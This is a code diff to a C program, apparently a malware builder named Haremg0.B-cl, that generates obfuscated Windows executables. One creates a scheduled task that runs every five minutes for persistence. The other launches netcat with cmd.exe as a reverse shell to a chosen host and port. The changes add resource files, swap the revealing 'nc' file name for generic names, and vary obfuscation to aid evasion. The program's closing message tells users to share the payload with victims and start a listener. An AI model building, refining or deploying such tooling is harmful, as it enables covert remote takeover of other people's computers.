@@ -1,4 +1,5 @@
 #include <stdlib.h>
+#include <time.h>
 #include <stdio.h>
 #include <string.h>
 #include <unistd.h>
@@ -17,19 +18,25 @@ void get(char *prompt, char *str, int size)
     fflush(stdin);
 }
 
-void compile(char *compiled_file, char *first_file_provided)
+void compile(char *compiled_file, char *first_file_provided, char *type)
 {
     char cmd[2000];
 
-    strcpy(cmd, "start g++ ");
+    strcpy(cmd, "windres RES/RC/res_");
+    strcat(cmd, type);
+    strcat(cmd, ".rc -O coff -o RES/RC/res_TMP");
+    system(cmd);
+    sleep(2);
+    cmd[0] = '\0';
+    strcat(cmd, "start g++ -static ");
     strcat(cmd, compiled_file);
-    strcat(cmd, " -o OUTPUT/");
+    strcat(cmd, " RES/RC/res_TMP -o OUTPUT/");
     strcat(cmd, first_file_provided);
     strcat(cmd, ".exe");
-
     system(cmd);
     sleep(2);
     remove(compiled_file);
+    remove("RES/RC/res_TMP");
 }
 
 char *generateRandomString(char *string, const int length)
@@ -67,7 +74,7 @@ void obfuscate(char *tmp_file_name, char *cmd_non_obfuscate)
     {
         char letter[2] = {alphabet[i], '\0'};
         strcat(source_code, "std::string ");
-        strcat(source_code, generateRandomString(random_variable, 20));
+        strcat(source_code, generateRandomString(random_variable, rand() % 50 +1));
         strcat(source_code, " = \"");
         strcat(source_code, letter);
         strcat(source_code, "\";");
@@ -102,7 +109,7 @@ void obfuscate(char *tmp_file_name, char *cmd_non_obfuscate)
     fclose(c_TMP);
 }
 
-void generatePayload(char *victim_dir, char *file_provider, char *first_file_provided, char *second_file_provided, char *task_name, char *task_trigger)
+void generatePayload(char *victim_dir, char *file_provider, char *first_file_provided, char *second_file_provided, char *task_name, char *task_trigger, char *payload_name)
 {
     char cmd_PAYLOAD[1000];
 
@@ -136,7 +143,7 @@ void generatePayload(char *victim_dir, char *file_provider, char *first_file_pro
     strcat(cmd_PAYLOAD, ".exe & exit\"");
 
     obfuscate("c_TMP_PAYLOAD.cpp", cmd_PAYLOAD);
-    compile("c_TMP_PAYLOAD.cpp", "PAYLOAD");
+    compile("c_TMP_PAYLOAD.cpp", payload_name, "PAYLOAD");
 }
 
 void generateExtension(char *victim_dir, char *host, char *port, char *second_file_provided, char *first_file_provided)
@@ -155,11 +162,13 @@ void generateExtension(char *victim_dir, char *host, char *port, char *second_fi
     strcat(cmd_EXTENSION, " -e cmd.exe -d ^");
 
     obfuscate("c_TMP_EXTENSION.cpp", cmd_EXTENSION);
-    compile("c_TMP_EXTENSION.cpp", first_file_provided);
+    compile("c_TMP_EXTENSION.cpp", first_file_provided, "FILE_A");
 }
 
 int main(int argc, char const *argv[])
 {
+    srand(time(NULL));
+
     printf(".___.__  .______  .______  ._______._____.___ ._____  \n");
     printf(":   |  \\ :      \\ : __   \\ : .____/:         |:_ ___\\ \n");
     printf("|   :   ||   .   ||  \\____|| : _/\\ |   \\  /  ||   |___\n");
@@ -170,6 +179,7 @@ int main(int argc, char const *argv[])
 
     printf(" Created by mickdec. https://github.com/mickdec/Haremg0.B-cl\n\n");
 
+    char payload_name[200] = "PAYLOAD";
     char choice[10];
     char victim_dir[255];
     char file_provider[255];
@@ -287,8 +297,8 @@ int main(int argc, char const *argv[])
         else if (strcmp(choice, "n") == 0 || strcmp(choice, "N") == 0)
         {
             strcpy(victim_dir, "C:/System");
-            strcpy(first_file_provided, "EXTENSION");
-            strcpy(second_file_provided, "nc");
+            strcpy(first_file_provided, "FILE_A");
+            strcpy(second_file_provided, "FILE_B");
             strcpy(task_name, "TaskSystem");
             strcpy(task_trigger, "/sc minute /mo 5");
 
@@ -319,10 +329,10 @@ int main(int argc, char const *argv[])
     printf("HOST PROVIDED : %s\n", host);
     printf("PORT PROVIDED : %s\n", port);
 
-    generatePayload(victim_dir, file_provider, first_file_provided, second_file_provided, task_name, task_trigger);
+    generatePayload(victim_dir, file_provider, first_file_provided, second_file_provided, task_name, task_trigger, payload_name);
     generateExtension(victim_dir, host, port, second_file_provided, first_file_provided);
 
-    printf("Now you just have to place %s and %s here %s, share the PAYLOAD and start your listener.\nHappy hunting !!", first_file_provided, second_file_provided, file_provider);
+    printf("Now you just have to place %s.exe and %s.exe here %s, share %s.exe and start your listener.\nHappy hunting !!", first_file_provided, second_file_provided, file_provider, payload_name);
     scanf("%d");
 
     return 0;
